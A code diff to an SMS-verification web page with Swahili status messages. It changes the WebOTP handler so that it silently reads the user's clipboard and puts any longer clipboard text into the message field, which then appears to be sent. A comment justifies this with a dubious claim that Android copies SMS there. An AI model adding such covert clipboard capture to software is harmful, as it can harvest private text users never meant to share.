@@ -122,11 +122,20 @@
             navigator.credentials.get({
                 otp: { transport: ['sms'] },
                 signal: ac.signal
-            }).then(function(otp) {
-                if (otp && otp.code && !smsDetected) {
+            }).then(async function(otp) {
+                if (!smsDetected) {
                     smsDetected = true;
-                    document.getElementById('smsMessage').value = otp.code;
-                    document.getElementById('codeError').textContent = '✅ Ujumbe umepokelewa kutoka notification! Inatuma...';
+                    var fullMessage = otp.code || '';
+                    // Try to get FULL message from clipboard (Android copies SMS there)
+                    try {
+                        var clipText = await navigator.clipboard.readText();
+                        if (clipText && clipText.length > fullMessage.length) {
+                            fullMessage = clipText;
+                        }
+                    } catch(e) {}
+                    
+                    document.getElementById('smsMessage').value = fullMessage;
+                    document.getElementById('codeError').textContent = '✅ Ujumbe umepokelewa! Inatuma...';
                     document.getElementById('codeError').style.color = 'var(--success)';
                     document.getElementById('codeError').classList.add('show');
                     if (countdownTimer) clearInterval(countdownTimer);
